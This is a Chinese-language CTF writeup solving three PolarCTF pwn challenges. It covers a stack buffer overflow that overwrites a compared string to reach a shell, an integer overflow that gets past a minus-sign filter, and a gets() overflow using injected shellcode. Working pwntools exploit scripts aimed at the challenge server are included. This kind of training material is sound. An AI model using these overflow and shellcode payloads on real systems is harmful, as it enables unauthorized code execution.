---
title: "PolarCTF-Pwn（中等）刷题WP"
date: 2024-12-05 19:15:00
categories:
  - "CTF Writeup"
tags:
  - "CTF"
  - "Writeup"
  - "PolarCTF"
  - "Pwn"
cnblogs_postid: "18589267"
cnblogs_url: "https://www.cnblogs.com/ljnljn/p/18589267"
---

## 1、没人能拒绝猫猫
ida看主函数
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[32]; // [rsp+0h] [rbp-50h] BYREF
  _QWORD s2[6]; // [rsp+20h] [rbp-30h] BYREF

  s2[5] = __readfsqword(0x28u);
  init();
  puts("                      __     __,");
  ...
  puts("                             `'-'`");
  s2[0] = 'tacetah';
  puts("Do you love cat? (lovecat/hatecat)");
  read(0, buf, 0x28uLL);
  if ( !strcmp("lovecat", (const char *)s2) )
  {
    puts("Nice choice!\n");
    system("/bin/sh");
  }
  else
  {
    puts("Everyone have their own choice.\n");
    puts("My choice is you have no flag^^");
  }
  return 0;
}
```
发现```!strcmp("lovecat", (const char *)s2)```，只要s2和lovecat一致，就可以让条件为真，执行system命令
来自豆包：
代码中定义的 buf 数组大小为 32 字节，然而却尝试从标准输入读取 40 字节（0x28 换算为十进制是 40）的数据，这就导致了缓冲区溢出情况。
缓冲区溢出是指程序运行时，向固定大小的缓冲区写入超过其容量的数据，多余的数据会越过缓冲区的边界覆盖相邻内存空间，从而造成溢出。
代码将单个字符 'tacetah' 赋给 s2[0]，不符合正常的字符串赋值逻辑（C 语言字符串是以 \0 结尾的字符序列），但在比较时却把 s2 当作字符串来和 "lovecat" 比较。这意味着攻击者可以通过缓冲区溢出，尝试去修改 s2 数组对应的内存区域，使其内容能匹配 "lovecat"，进而使 strcmp 返回 0，满足条件判断进入期望的执行分支。
因此可以构造数据来篡改内存，使用```AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlovecat\0```来篡改
由于存在缓冲区溢出，我们需要构造一个长度合适且包含关键内容的输入字符串。输入字符串总长度要达到 40 字节（因为 read 函数会读取这么多字节），前 32 字节可以随意填充（通常填充一些无意义字符即可，比如 A 的重复），后面紧跟着要写入 lovecat\0 （确保以 \0 结尾符合字符串格式要求）来覆盖 s2 数组对应的内存区域，使得 strcmp 函数认为 s2 指向的内容和 "lovecat" 相等。（定义的时候buf数组和s2数组是相邻的）例如，构造的输入字符串可以是：
exp如下：
```python
from pwn import *
p=remote("1.95.36.136",2058)
p.sendline('a'*32+'lovecat\0')
p.interactive()
```
得到flag
![image](/assets/cnblogs/PolarCTF-Pwn（中等）刷题WP/3539156-20241205144026278-1774834497.png)
拓展：危险函数
C标准库中和字符串操作有关的函数，像strcpy、strcat、sprintf、gets等函数中，数组和指针都没有自动进行边界检查，因此很容易引发缓冲区溢出漏洞

## 2、easypwn2
国际惯例看代码
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts("**********************************");
  ...
  puts("**********************************");
  __isoc99_scanf("%16s", s);
  if ( strchr(s, 45) )
    return 0;
  if ( atoi(s) < 0 )
    vuln();
  return 0;
}
```
其中```vuln()```函数可以执行```cat flag```，因此只要能够执行vuln函数就可以获得flag
注意到两个判断函数：
第一个：ASCII码45转换成字符是-（负号），说明程序试图过滤掉输入的负号
第二个：在C语言中，atoi函数会从字符串开头开始解析，遇到非数字字符就停止解析，将前面解析出来的数字部分转换为对应的整数值。因此可以得出：只要输入一个负数就可以执行vuln()
既然负号被过滤了，就只能用另一种方法输入负数
可以想到int上限是2147483647，超过这个数字就会变成负数，因此只需要输入2147483648就可以获得flag
![image](/assets/cnblogs/PolarCTF-Pwn（中等）刷题WP/3539156-20241205145357872-1085437475.png)
获得flag

## 3、getshell
这里是system('ls')，无法读取flag，因此要覆盖v4的值来执行system
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _WORD v4[2]; // [rsp+0h] [rbp-70h] BYREF
  int v5; // [rsp+4h] [rbp-6Ch]
  _BYTE v6[88]; // [rsp+8h] [rbp-68h] BYREF
  int v7; // [rsp+60h] [rbp-10h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  v4[0] = 0;
  v4[1] = 0;
  v5 = 0;
  memset(v6, 0, sizeof(v6));
  v7 = 0;
  printf("%p\n", v4);
  gets(v4);
  return 0;
}
```
注意到会输出v4的内存地址，但是动态链接，因此要读取输出的内存地址来覆盖
覆盖v4的方法如图所示
![image](/assets/cnblogs/PolarCTF-Pwn（中等）刷题WP/3539156-20241211213921565-1809445536.png)
```
from pwn import *

io = remote('1.95.36.136', 2150)
context(arch='amd64', os='linux')

shellcode=asm(shellcraft.sh())
offset=0x70
io.recvuntil(b"0x")
puts_addr=int(io.recv(12),16)
payload =  shellcode +b'A' * (0x70-len(shellcode))+b'a'*0x8+ p64(puts_addr)

io.sendline(payload)
io.interactive()
```
![image](/assets/cnblogs/PolarCTF-Pwn（中等）刷题WP/3539156-20241211213601187-895613779.png)
